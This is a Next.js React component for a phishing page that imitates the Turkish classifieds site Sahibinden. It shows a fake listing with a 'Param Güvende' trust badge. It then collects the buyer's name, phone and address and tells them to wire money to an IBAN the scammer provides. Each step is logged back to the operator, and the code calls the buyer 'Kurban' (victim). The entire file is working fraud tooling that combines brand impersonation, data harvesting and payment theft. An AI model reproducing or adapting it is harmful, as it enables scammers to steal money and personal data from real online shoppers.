'use client';

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';

export default function SahibindenTemplate() {
    const params = useParams();
    const slug = params.slug as string;
    const [ilan, setIlan] = useState<any>(null);
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(false);
    
    // Form states
    const [address, setAddress] = useState({ ad: '', soyad: '', il: '', ilce: '', mahalle: '', tel: '', tc: '', adres: '' });

    useEffect(() => {
        fetchIlan();
    }, [slug]);

    const fetchIlan = async () => {
        try {
            const res = await fetch(`/api/ilan/${slug}`);
            if (res.ok) {
                const data = await res.json();
                setIlan(data);
                logAksiyon('İlana Giriş Yaptı', 'Kurban vitrini inceliyor.');
            } else {
                setError(true);
            }
        } catch (e) {
            setError(true);
        } finally {
            setLoading(false);
        }
    };

    const logAksiyon = async (aksiyon: string, detay: string = "") => {
        if (!ilan) return;
        try {
            await fetch('/api/log-ekle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    saticiId: ilan.olusturanMusteri,
                    ilanBasligi: ilan.urunAdi,
                    aksiyon,
                    detay,
                    ip: 'Pending', // Server side should handle IP
                    cihaz: navigator.userAgent.includes('iPhone') ? 'Apple iOS' : 'Android/PC',
                    tarih: new Date().toLocaleDateString('tr-TR'),
                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
                })
            });
        } catch (e) {}
    };

    if (loading) return <div className="loader">Yükleniyor...</div>;
    if (error) return <div className="error-screen">İlan Yayında Değil</div>;

    return (
        <div className="app-container">
            <header className="header">
                <button onClick={() => setStep(Math.max(1, step - 1))} className="back-btn">❮</button>
                <div className="header-title">{step === 1 ? 'İlan Detayı' : 'Güvenli Ödeme'}</div>
            </header>

            {step === 1 && (
                <div className="step-1 animate-fade">
                    <div className="gallery">
                        <img src={ilan.anaResim} alt="product" />
                        <div className="prem-rozet"><span>Param Güvende</span></div>
                    </div>
                    <div className="info-card">
                        <div className="price">{ilan.fiyat} TL</div>
                        <h1 className="title">{ilan.urunAdi}</h1>
                        <p className="description">{ilan.urunAciklamasi}</p>
                    </div>
                    <div className="bottom-bar">
                        <button className="btn-buy" onClick={() => { setStep(2); logAksiyon('Sepete Girdi', 'Sipariş özetine geçti.'); }}>Hemen Al</button>
                    </div>
                </div>
            )}

            {step === 2 && (
                <div className="step-2 animate-fade">
                    <div className="order-summary">
                        <h2>SİPARİŞ ÖZETİ</h2>
                        <div className="product-row">
                            <img src={ilan.anaResim} alt="product" />
                            <span>{ilan.urunAdi}</span>
                        </div>
                        <ul className="price-list">
                            <li><span>Ürün Bedeli</span> <span>{ilan.fiyat} TL</span></li>
                            <li><span>Hizmet Bedeli</span> <span>0 TL</span></li>
                            <li className="total"><span>Toplam</span> <span>{ilan.fiyat} TL</span></li>
                        </ul>
                    </div>
                    <div className="bottom-bar">
                        <button className="btn-next" onClick={() => { setStep(3); logAksiyon('Adres Formuna Girdi', 'Teslimat bilgilerini dolduruyor.'); }}>Devam Et</button>
                    </div>
                </div>
            )}

            {step === 3 && (
                <div className="step-3 animate-fade">
                    <div className="address-form">
                        <h2>Teslimat Adresi</h2>
                        <input type="text" placeholder="Ad" onChange={e => setAddress({...address, ad: e.target.value})} />
                        <input type="text" placeholder="Soyad" onChange={e => setAddress({...address, soyad: e.target.value})} />
                        <input type="text" placeholder="Telefon" onChange={e => setAddress({...address, tel: e.target.value})} />
                        <textarea placeholder="Tam Adres" onChange={e => setAddress({...address, adres: e.target.value})}></textarea>
                    </div>
                    <div className="bottom-bar">
                        <button className="btn-next" onClick={() => { setStep(4); logAksiyon('Ödeme Sayfasına Geçti', `Adres: ${address.adres}`); }}>Ödemeye Geç</button>
                    </div>
                </div>
            )}

            {step === 4 && (
                <div className="step-4 animate-fade">
                    <div className="payment-box">
                        <h2>Banka Havalesi / EFT</h2>
                        <p>Lütfen aşağıdaki IBAN adresine ödemenizi yapın.</p>
                        <div className="iban-card">
                            <span>ALICI IBAN</span>
                            <div className="iban">{ilan.iban || 'TR00...'}</div>
                        </div>
                        <div className="iban-card">
                            <span>ALICI AD SOYAD</span>
                            <div className="name">{ilan.saticiAdi || 'İsimsiz'}</div>
                        </div>
                    </div>
                    <div className="bottom-bar">
                        <button className="btn-finish" onClick={() => { alert('Siparişiniz alındı, kontrol ediliyor.'); logAksiyon('Siparişi Tamamladı', 'Dekont yükleme bekleniyor.'); }}>Siparişi Tamamla</button>
                    </div>
                </div>
            )}

            <style jsx>{`
                .app-container { max-width: 480px; margin: 0 auto; background: #f3f4f7; min-height: 100vh; font-family: sans-serif; }
                .header { background: #0059a3; color: #fff; padding: 15px; display: flex; align-items: center; position: sticky; top: 0; z-index: 100; }
                .back-btn { background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; margin-right: 15px; }
                .header-title { font-weight: bold; flex: 1; text-align: center; }
                
                .gallery { position: relative; background: #fff; }
                .gallery img { width: 100%; height: 300px; object-fit: contain; }
                .prem-rozet { position: absolute; top: 10px; left: 10px; background: #48b8a6; color: #fff; padding: 5px 10px; border-radius: 15px; font-size: 12px; }

                .info-card { background: #fff; padding: 20px; border-bottom: 1px solid #eee; margin-bottom: 80px; }
                .price { color: #0059a3; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
                .title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
                .description { font-size: 14px; color: #666; line-height: 1.6; }

                .bottom-bar { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; padding: 15px; border-top: 1px solid #eee; }
                .btn-buy { width: 100%; background: #16b4a1; color: #fff; border: none; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; }
                .btn-next, .btn-finish { width: 100%; background: #0059a3; color: #fff; border: none; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; }

                .order-summary { background: #fff; padding: 20px; }
                .order-summary h2 { font-size: 14px; color: #888; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
                .product-row { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
                .product-row img { width: 60px; height: 60px; border-radius: 5px; }
                .price-list { list-style: none; }
                .price-list li { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
                .total { font-weight: bold; color: #0059a3; font-size: 16px !important; }

                .address-form { background: #fff; padding: 20px; }
                .address-form input, .address-form textarea { width: 100%; padding: 12px; border: 1px solid #eee; margin-bottom: 10px; border-radius: 5px; }

                .payment-box { background: #fff; padding: 20px; }
                .iban-card { background: #f9f9f9; padding: 15px; border-radius: 5px; border: 1px solid #eee; margin-bottom: 15px; }
                .iban-card span { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
                .iban { font-weight: bold; color: #000; letter-spacing: 1px; }

                .animate-fade { animation: fadeIn 0.3s ease-in-out; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                .loader { display: flex; align-items: center; justify-content: center; height: 100vh; font-weight: bold; color: #0059a3; }
                .error-screen { display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; font-weight: bold; color: #ef4444; }
            `}</style>
        </div>
    );
}
